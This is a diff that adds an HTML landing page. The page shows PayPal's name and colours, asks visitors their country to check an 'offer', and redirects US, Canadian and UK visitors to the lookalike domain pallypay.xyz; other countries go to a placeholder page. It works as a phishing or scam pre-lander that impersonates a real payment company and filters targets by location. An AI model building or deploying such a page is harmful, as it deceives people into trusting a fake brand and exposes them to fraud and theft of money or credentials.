@@ -1,0 +1,422 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Check Availability</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #0070ba 0%, #003087 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #fff;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background:
+                radial-gradient(circle at 20% 50%, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(255, 255, 255, 0.08) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+            position: relative;
+            z-index: 1;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 24px;
+            padding: 32px 28px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.5s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #0070ba 0%, #003087 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a1a;
+            text-align: center;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+            line-height: 1.2;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .step-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #e0e0e0;
+        }
+
+        .step-dot.active {
+            background: linear-gradient(135deg, #0070ba 0%, #003087 100%);
+            width: 24px;
+            border-radius: 4px;
+        }
+
+        .question-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .country-btn {
+            background: #fff;
+            border: 2px solid #e5e7eb;
+            color: #1a1a1a;
+            padding: 14px 20px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .country-btn:hover {
+            border-color: #0070ba;
+            background: #f9fafb;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 112, 186, 0.15);
+        }
+
+        .country-btn:active {
+            transform: translateY(0);
+        }
+
+        .country-content {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .flag {
+            font-size: 20px;
+            filter: drop-shadow(0 1px 2px rgba(0,0,0,0.1));
+        }
+
+        .arrow {
+            font-size: 18px;
+            color: #999;
+            transition: all 0.2s;
+        }
+
+        .country-btn:hover .arrow {
+            color: #0070ba;
+            transform: translateX(4px);
+        }
+
+        .continue-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #0070ba 0%, #003087 100%);
+            border: none;
+            color: #fff;
+            padding: 14px 24px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0, 112, 186, 0.3);
+            margin-top: 8px;
+            display: none;
+        }
+
+        .continue-btn.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .continue-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 112, 186, 0.4);
+        }
+
+        .continue-btn:active {
+            transform: translateY(0);
+        }
+
+        .other-btn {
+            background: transparent;
+            border: none;
+            color: #999;
+            padding: 8px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .other-btn:hover {
+            color: #0070ba;
+        }
+
+        .disclaimer {
+            font-size: 11px;
+            color: #999;
+            text-align: center;
+            margin-top: 16px;
+            line-height: 1.5;
+        }
+
+        .selected {
+            border-color: #0070ba !important;
+            background: linear-gradient(135deg, rgba(0, 112, 186, 0.08) 0%, rgba(0, 48, 135, 0.08) 100%) !important;
+            position: relative;
+        }
+
+        .selected::after {
+            content: '✓';
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 24px;
+            background: linear-gradient(135deg, #0070ba 0%, #003087 100%);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 24px 20px;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+
+            .subtitle {
+                font-size: 13px;
+            }
+
+            .country-btn {
+                padding: 12px 16px;
+                font-size: 14px;
+            }
+
+            .logo-text {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <div class="logo-text">PayPal</div>
+            </div>
+
+            <div class="step-indicator">
+                <div class="step-dot active"></div>
+                <div class="step-dot"></div>
+                <div class="step-dot"></div>
+            </div>
+
+            <h1>Quick Question First</h1>
+
+            <p class="subtitle">
+                Select your location below to see if this offer is available in your area.
+            </p>
+
+            <p class="question-label">Where are you located?</p>
+
+            <div class="button-group">
+                <button class="country-btn" onclick="selectCountry(this, 'USA')">
+                    <div class="country-content">
+                        <span class="flag">🇺🇸</span>
+                        <span>United States</span>
+                    </div>
+                    <span class="arrow">→</span>
+                </button>
+
+                <button class="country-btn" onclick="selectCountry(this, 'Canada')">
+                    <div class="country-content">
+                        <span class="flag">🇨🇦</span>
+                        <span>Canada</span>
+                    </div>
+                    <span class="arrow">→</span>
+                </button>
+
+                <button class="country-btn" onclick="selectCountry(this, 'UK')">
+                    <div class="country-content">
+                        <span class="flag">🇬🇧</span>
+                        <span>United Kingdom</span>
+                    </div>
+                    <span class="arrow">→</span>
+                </button>
+            </div>
+
+            <button class="continue-btn" id="continueBtn" onclick="proceedToOffer()">
+                Continue
+            </button>
+
+            <button class="other-btn" onclick="selectCountry(null, 'Other')">
+                I'm in a different country
+            </button>
+
+            <p class="disclaimer">
+                By continuing, you agree to the terms and conditions. Availability may vary by location.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        let selectedCountry = null;
+
+        function selectCountry(button, country) {
+            // Remove previous selection
+            document.querySelectorAll('.country-btn').forEach(btn => {
+                btn.classList.remove('selected');
+            });
+
+            if (country === 'USA' || country === 'Canada' || country === 'UK') {
+                // Mark as selected
+                if (button) {
+                    button.classList.add('selected');
+                }
+                selectedCountry = country;
+
+                // Show continue button
+                document.getElementById('continueBtn').classList.add('show');
+            } else {
+                // NOT QUALIFIED - Redirect immediately
+                localStorage.setItem('userCountry', country);
+                setTimeout(() => {
+                    window.location.href = 'https://your-alternative-page.com';
+                }, 300);
+            }
+        }
+
+        function proceedToOffer() {
+            if (!selectedCountry) return;
+
+            // Store the selection
+            localStorage.setItem('userCountry', selectedCountry);
+
+            // QUALIFIED - Redirect to pallypay.xyz
+            window.location.href = 'https://pallypay.xyz';
+        }
+
+        // Optional: Auto-detect country using IP geolocation API
+        // Uncomment and add your API key if you want automatic detection
+        /*
+        async function detectCountry() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                const countryCode = data.country_code;
+
+                // Auto-select the detected country
+                if (countryCode === 'US') {
+                    selectCountry(document.querySelector('.country-btn:nth-child(1)'), 'USA');
+                } else if (countryCode === 'CA') {
+                    selectCountry(document.querySelector('.country-btn:nth-child(2)'), 'Canada');
+                } else if (countryCode === 'GB') {
+                    selectCountry(document.querySelector('.country-btn:nth-child(3)'), 'UK');
+                }
+            } catch (error) {
+                console.log('Could not detect country');
+            }
+        }
+
+        detectCountry();
+        */
+    </script>
+</body>
+</html>
